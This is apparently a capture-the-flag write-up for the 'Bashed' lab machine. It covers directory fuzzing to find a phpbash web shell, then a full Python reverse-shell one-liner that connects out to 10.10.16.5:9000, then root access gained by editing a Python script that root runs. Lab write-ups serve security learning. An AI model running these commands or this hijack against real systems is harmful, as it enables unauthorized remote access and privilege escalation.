# Bashed

## Nmap scan

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

## Site enumeration

We can find a site that links to this [github ](https://github.com/Arrexel/phpbash)there is supposed to be a phpbash.php file but we cant find it lets run ffuf to find hidden directories.

&#x20;And ffuf finds the dev directory and phpbash does exist here!!

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

We can now get the user flag!!

## Priv esc

To get a more stable shell we use this reverse shell

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.5",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
```

Now we have a stable shell lets tru sudo -l and linpeas... Nothing immediate pops up.

If we look around though we can find an interesting direction called scripts. Inside we find a python file that we own and a test.txt file that's written by root. We can assume based off this that this python is run as root.

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Let's test our hypothesis by changing the python file to test if the test.txt file changes

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

After a few seconds we can see the test file reflects our changes. We can now change the test.py file to contain a reverse shell and we get root!!

PWNDDD
